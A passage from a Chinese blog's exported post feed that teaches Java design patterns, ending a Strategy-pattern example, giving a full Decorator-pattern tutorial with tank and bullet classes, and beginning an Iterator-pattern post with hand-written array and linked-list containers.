<p>当我们想要对猫的Width属性进行排序的时候，只需在调用sort函数时，传入Cat实例和CatWidthComparator实例即可。</p>
<p>此时的sort函数：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sorter</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sort</span><span class="hljs-params">(T[] arr, Comparator&lt;T&gt; comparator)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; arr.length - <span class="hljs-number">1</span>; i++) &#123;<br>            <span class="hljs-keyword">int</span> minPos = i;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i+<span class="hljs-number">1</span>; j &lt; arr.length; j++) &#123;<br>                minPos = comparator.compare(arr[j], arr[minPos]) == -<span class="hljs-number">1</span> ? j : minPos;<br>            &#125;<br>            swap(arr, i, minPos);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(T[] arr, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> minPos)</span> </span>&#123;<br>        T temp = arr[i];<br>        arr[i] = arr[minPos];<br>        arr[minPos] = temp;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>此时我们用Mian函数调用即可</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><span class="hljs-comment">//        Dog[] o = new Dog[]&#123;new Dog(5), new Dog(1), new Dog(3)&#125;;</span><br><span class="hljs-comment">//        Sorter&lt;Dog&gt; sorter = new Sorter&lt;Dog&gt;();</span><br>        Cat[] o = <span class="hljs-keyword">new</span> Cat[]&#123;<span class="hljs-keyword">new</span> Cat(<span class="hljs-number">5</span>,<span class="hljs-number">3</span>), <span class="hljs-keyword">new</span> Cat(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>), <span class="hljs-keyword">new</span> Cat(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>)&#125;;<br>        Sorter&lt;Cat&gt; sorter = <span class="hljs-keyword">new</span> Sorter&lt;Cat&gt;();<br>        sorter.sort(o, <span class="hljs-keyword">new</span> CatWidthComparator());<br>        System.out.println(Arrays.toString(o));<br><br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">[Cat&#123;Width=<span class="hljs-number">1</span>, Height=<span class="hljs-number">5</span>&#125;, Cat&#123;Width=<span class="hljs-number">3</span>, Height=<span class="hljs-number">1</span>&#125;, Cat&#123;Width=<span class="hljs-number">5</span>, Height=<span class="hljs-number">3</span>&#125;]<br></code></pre></div></td></tr></table></figure>

<p>如果你想要对Cat的Height属性进行排序时，只要实现CatHeigthComparator类即可，Dog亦是如此。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总体来看，策略模式让算法的变化独立于使用算法的客户，把具体的算法实现从业务逻辑中剥离出来，成为一系列独立算法类，使得它们可以相互替换，这样大大减少了代码的之间的耦合。</p>
</font>]]></content>
      <categories>
        <category>程序猿</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式3--Decorator</title>
    <url>/article/7b16bbe2.html</url>
    <content><![CDATA[<h2 id="修饰器模式"><a href="#修饰器模式" class="headerlink" title=" 修饰器模式"></a><a href="https://www.runoob.com/design-pattern/decorator-pattern.html" target="_blank" rel="noopener"> 修饰器模式</a></h2><p><font size="4" face="PingFang SC">&emsp;&emsp;装饰器模式（Decorator Pattern）允许向一个现有的对象添加新的功能，同时又不改变其结构。这种类型的设计模式属于<font color="#FFB6C1" size="5" face="Open Sans"> 结构型模式 </font>，它是作为现有的类的一个包装。</p>
<p>这种模式创建了一个装饰类，用来包装原有的类，并在保持类方法签名完整性的前提下，提供了额外的功能。</p>
<p>我们通过下面的实例来演示装饰器模式的用法。其中，我们将把一个形状装饰上不同的颜色，同时又不改变形状类。</p>
<p>如果想了解修饰器模式的具体的介绍，菜鸟教程介绍得比较详细↓<br><a href="https://www.runoob.com/design-pattern/decorator-pattern.html" target="_blank" rel="noopener" class="LinkCard">菜鸟教程-修饰器模式</a></p>
<h2 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h2><p><img src="https://qiniuyun.fxhstudy.com/Decorator%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F4.png" srcset="/img/loading.gif"><a href="https://www.cnblogs.com/sayook/p/9101376.html" target="_blank" rel="noopener" class="link-text" align="center">参考博客</a><br></p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>优点： 装饰类和被装饰类可以独立发展，不会相互耦合，装饰模式是继承的一个替代模式，装饰模式可以动态扩展一个实现类的功能。</p>
<p>缺点： 多层装饰比较复杂。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>1、扩展一个类的功能。<br>2、动态增加功能，动态撤销。</p>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>这里是拿别人的例子来说的，我们都知道坦克大战这个游戏，在游戏设计完了，玩了一段时间后，我觉得游戏里的坦克不够炫，没有别人设计的那种感觉。于是这时，我想给他加一个外壳，加一条尾巴，再加个血条。这酷!<br>这不难实现吧。但我们要求是，再给坦克发出的子弹也加上一条尾巴和外壳。</p>
<h3 id="方法一-×"><a href="#方法一-×" class="headerlink" title="方法一(×)"></a>方法一(×)</h3><p>即使不会设计模式，大部分人也能够想到用继承来实现。是的，这是一种方法，<br>当我们需要加血条是，继承Tank类，实现BloodTank，加尾巴，实现TailTank类，加外壳，实现RectTank类<br>类似的BloodTailTank、BloodRectTank、TailBullet…<br>但是缺点在哪里呢？当我们在修饰时，需要继承出来，产生新的类。这时当父类变化时，子类也需要跟着变化。</p>
<p>是不是一下看出来缺点了：</p>
<p><font color="#FF0000" size="5" face="Open Sans">不灵活：装饰和别装饰者之间耦合度太高。</font></p>
<p>此时就有了进一步的方法</p>
<h3 id="方法二-×"><a href="#方法二-×" class="headerlink" title="方法二(×)"></a>方法二(×)</h3><p>首先有了tank类，接着将tank和所需添加的装饰聚合到一个TankDecorator类中，接着建立TankDecorator类。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">TankDecorator = <br>	tank();<br>	paint() -&gt; tank.paint() + 装饰(Blood+Rect+Tail+...)<br></code></pre></div></td></tr></table></figure>

<p>这么一看是不是比抽象要好很多了。<br>But，依然不够完美，比如说，我们要将装饰(尾巴，血条)装饰到子弹上，用TankDecorator就不行了，因为里面聚合的是坦克，此时就还需要写一个BulletDecorator类。</p>
<h3 id="方法三-√"><a href="#方法三-√" class="headerlink" title="方法三(√)"></a>方法三(√)</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>我们采用的就是要说的修饰器模式。</p>
<p><font color="#FF0000" size="5" face="Open Sans">将聚合的tank -&gt; GameObject</font></p>
<p><img src="https://qiniuyun.fxhstudy.com/Decorator%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F3.png" srcset="/img/loading.gif"><br/></p>
<p>此时变为</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Decorator = <br>	GameObject();<br></code></pre></div></td></tr></table></figure>

<p>此时Decorator不是专属于子弹或坦克，它是给GameObject做装饰的，所以任何的GameObject都可以和某种具体的Decorator聚合到一起<br>这时，子弹也可以和某种具体的Decorator聚合到一起。例如，在子弹上添加RectDecorator和TailDecorator,需要做的是，new 一个 RectDecorator,将子弹传入,接着new 一个TailDecorator,将子弹传入进来。</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>首先创建一个GameObject接口</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">GameObject.java<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">GameObject</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">draw</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>创建子弹实体类(Bullet)和坦克实体类(Tank)实现 GameObject 接口</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Bullet.java<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bullet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">GameObject</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">draw</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">"GameObject:Bullet"</span>);<br>    &#125;<br>&#125;<br><br>Tank.java<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tank</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">GameObject</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">draw</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">"GameObject:Tank"</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>接着，创建实现了 GameObject 接口的抽象装饰类</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">GODecorator.java<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GODecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">GameObject</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> GameObject decoratorGameObject;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">GODecorator</span><span class="hljs-params">(GameObject decoratorGameObject)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.decoratorGameObject = decoratorGameObject;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">draw</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">"GameObject:GODecorator"</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>创建扩展了 GODecorator 类的实体装饰类。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">RectDecorator.java<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RectDecorator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">GODecorator</span></span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">RectDecorator</span><span class="hljs-params">(GameObject decoratorGameObject)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(decoratorGameObject);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">draw</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.draw();<br>        setRectDecorator(decoratorGameObject);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setRectDecorator</span><span class="hljs-params">(GameObject decoratorGameObject)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">" + Rect"</span>);<br>    &#125;<br>&#125;<br><br>TailDecorator.java<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TailDecorator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">GODecorator</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TailDecorator</span><span class="hljs-params">(GameObject decoratorGameObject)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(decoratorGameObject);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">draw</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>.draw();<br>        setTailDecorator(decoratorGameObject);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setTailDecorator</span><span class="hljs-params">(GameObject decoratorGameObject)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">" + Tail"</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>使用 RectDecorator 和 TailDecorator 来修饰 GameObject 对象</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>       Tank tank = <span class="hljs-keyword">new</span> Tank();<br>       <span class="hljs-comment">//给坦克加上外壳</span><br>       GODecorator rectTank = <span class="hljs-keyword">new</span> RectDecorator(tank);<br>       GODecorator tailTank = <span class="hljs-keyword">new</span> TailDecorator(tank);<br>       tank.draw();<br>       rectTank.draw();<br>       tailTank.draw();<br><br>        Bullet bullet = <span class="hljs-keyword">new</span> Bullet();<br>        GODecorator rectTank1 = <span class="hljs-keyword">new</span> RectDecorator(bullet);<br>        GODecorator rectTailTank = <span class="hljs-keyword">new</span> TailDecorator(rectTank1);<br>        rectTailTank.draw();<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>执行步骤，输出结果</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">GameObject:Tank<br>GameObject:GODecorator<br> + Rect<br>GameObject:GODecorator<br> + Tail<br>---------------<br>GameObject:GODecorator<br> + Tail<br></code></pre></div></td></tr></table></figure>


</font>
]]></content>
      <categories>
        <category>程序猿</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式10-Iterator</title>
    <url>/article/a432832b.html</url>
    <content><![CDATA[<p><font size="4" face="PingFang SC">&emsp;&emsp;迭代器模式（Iterator Pattern）是 Java 和 .Net 编程环境中非常常用的设计模式。这种模式用于顺序访问集合对象的元素，不需要知道集合对象的底层表示。</p>
<p>迭代器模式属于<font color="#FFB6C1" size="5" face="Open Sans">  行为型模式  </font></p>
<p>如果想了解迭代器模式的具体的介绍，菜鸟教程介绍得比较详细↓<br><a href="https://www.runoob.com/design-pattern/iterator-pattern.html" target="_blank" rel="noopener" class="LinkCard">菜鸟教程-迭代器模式<br></a></p>
<h2 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h2><p><img src="https://qiniuyun.fxhstudy.com/Iterator.png" srcset="/img/loading.gif" title="迭代器模式"><br></p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>优点： </p>
<p>1、它支持以不同的方式遍历一个聚合对象。<br>2、迭代器简化了聚合类。<br>3、在同一个聚合上可以有多个遍历。<br>4、在迭代器模式中，增加新的聚合类和迭代器类都很方便，无须修改原有代码。</p>
<p>缺点： 由于在客户端和真实主题之间增加了代理对象，因此有些类型的迭代器模式可能会造成请求的处理速度变慢。<br>由于迭代器模式将存储数据和遍历数据的职责分离，增加新的聚合类需要对应增加新的迭代器类，类的个数成对增加，这在一定程度上增加了系统的复杂性。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>1、访问一个聚合对象的内容而无须暴露它的内部表示。<br>2、需要为聚合对象提供多种遍历方式。<br>3、为遍历不同的聚合结构提供一个统一的接口。</p>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>迭代器这个模式，其实在学Java的时候，相信大家就已经接触过了，所以这里就简单介绍一下。<br>这个可以去看看ArrayList、LinkList…这些容器的迭代器部分的源码(看源码真的能够学到很多知识!)</p>
<p>新的一天开始了,甲方爸爸为了使你成长,对你提出需求,构造一个容器,可以动态扩展:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 数组来实现容器</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ArrayList_</span></span>&#123;<br>    Object[] object = <span class="hljs-keyword">new</span> Object[<span class="hljs-number">10</span>];<br>    <span class="hljs-comment">//Object中下一个空的位置在哪儿，或者说，目前容器中有多少个元素</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Object o)</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (index == object.length)&#123;<br>            Object[] newObject = <span class="hljs-keyword">new</span> Object[object.length*<span class="hljs-number">2</span>];<br>            System.arraycopy(object, <span class="hljs-number">0</span>, newObject, <span class="hljs-number">0</span>, object.length);<br>            object = newObject;<br>        &#125;<br>        object[index++] = o;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> index;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 链表实现容器</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LinkList_</span></span>&#123;<br>    Node head = <span class="hljs-keyword">null</span>;<br>    Node tail = <span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Object o)</span></span>&#123;<br>        Node n = <span class="hljs-keyword">new</span> Node(o);<br>        n.next = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">if</span> (head == <span class="hljs-keyword">null</span>)&#123;<br>            head = n;<br>            tail = n;<br>        &#125;<br><br>        tail.next = n;<br>        tail = n;<br>        index++;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Node</span></span>&#123;<br>        <span class="hljs-keyword">private</span> Object object;<br>        Node next;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Node</span><span class="hljs-params">(Object o)</span></span>&#123;<br>            object = o;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> index;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这里实现了两种容器,一种是用数组来实现的,一种是用链表实现的。(任何容器都是由这两种结构来实现的)</p>
<p>接着将两种容器,整合一下,实现容器的替换。这里我们只要将两种容器实现一个接口就行了</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Collection_</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Object o)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ArrayList_</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Collection_</span></span>&#123;<br>    Object[] object = <span class="hljs-keyword">new</span> Object[<span class="hljs-number">10</span>];<br>    <span class="hljs-comment">//Object中下一个空的位置在哪儿，或者说，目前容器中有多少个元素</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Object o)</span></span>&#123;<br>        <span class="hljs-keyword">if</span> (index == object.length)&#123;<br>            Object[] newObject = <span class="hljs-keyword">new</span> Object[object.length*<span class="hljs-number">2</span>];<br>            System.arraycopy(object, <span class="hljs-number">0</span>, newObject, <span class="hljs-number">0</span>, object.length);<br>            object = newObject;<br>        &#125;<br>        object[index++] = o;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> index;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LinkList_</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Collection_</span></span>&#123;<br>    Node head = <span class="hljs-keyword">null</span>;<br>    Node tail = <span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Object o)</span></span>&#123;<br>        Node n = <span class="hljs-keyword">new</span> Node(o);<br>        n.next = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">if</span> (head == <span class="hljs-keyword">null</span>)&#123;<br>            head = n;<br>            tail = n;<br>        &#125;<br><br>        tail.next = n;<br>        tail = n;<br>        index++;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Node</span></span>&#123;<br>        <span class="hljs-keyword">private</span> Object object;<br>        